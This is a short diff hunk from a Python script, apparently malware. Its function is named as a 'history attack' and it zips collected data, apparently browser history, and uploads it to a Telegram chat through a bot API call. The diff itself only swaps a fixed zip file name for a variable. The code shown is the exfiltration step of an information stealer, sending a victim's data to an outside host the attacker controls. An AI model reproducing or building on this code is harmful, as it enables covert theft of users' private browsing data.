@@ -51,7 +51,7 @@ def historial_defuald_ataque():
 
         zip_buffer.seek(0)
 
-        archivos = {'document': ('default_history.zip', zip_buffer)}
+        archivos = {'document': (nombre_archivo_zip, zip_buffer)}
         parametros = {'chat_id': CHAT_ID}
         respuesta = requests.post(url_telegram, params=parametros, files=archivos)
 
